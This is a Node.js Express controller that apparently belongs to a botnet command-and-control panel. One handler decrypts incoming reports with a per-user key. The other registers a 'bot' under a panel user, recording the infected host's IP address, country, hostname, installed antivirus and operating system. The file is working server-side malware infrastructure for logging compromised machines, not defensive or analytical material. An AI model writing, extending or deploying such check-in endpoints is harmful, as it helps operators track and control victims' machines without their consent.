const database = require('../../database/database');
const cache = require('../cache');
const crypto = require('../crypto');

exports.reportDecrypt = async (req, res, next) => {
    const id = req.params.id;

    if (typeof id == 'undefined' || id == '') {
        return res.sendStatus(400);
    }

    if (cache.get(id) == "") {
        return res.sendStatus(400);
    }

    let user;
    if (cache.get(id) != "" && cache.get(id) != null) {
        user = cache.get(id);
    } else {
        user = await database.getUser(id);
        if (user == null) {
            cache.set(id, "");
            return res.sendStatus(400);
        }
    }

    let decrypt;
    try {
        decrypt = JSON.parse(crypto.decrypt(req.body, user.encryptedKey));
    } catch (e) {
        return res.sendStatus(400);
    }

    req.body = decrypt;
    next();
};

exports.reportPost = async (req, res) => {
    const id = req.params.id;

    if (typeof id == 'undefined' || id == '') {
        return res.sendStatus(400);
    }

    if (cache.get(id) == "") {
        return res.sendStatus(400);
    }

    let user;
    if (cache.get(id) != "" && cache.get(id) != null) {
        user = cache.get(id);
    } else {
        user = await database.getUser(id);
        if (user == null) {
            cache.set(id, "");
            return res.sendStatus(400);
        }
    }

    const ip = req.body.ip,
        country = req.body.country,
        hostname = req.body.hostname,
        av = req.body.av,
        os = req.body.os;
    
    if (typeof os == 'undefined' || os == '' || typeof ip == 'undefined' || ip == '' || typeof country == 'undefined' || country == '' || typeof hostname == 'undefined' || hostname == '' || typeof av == 'undefined' || av == '') {
        return res.sendStatus(400);
    }

    const botid = await database.addBot(user.username, hostname, ip, country, av, os);
    return res.send(botid);
};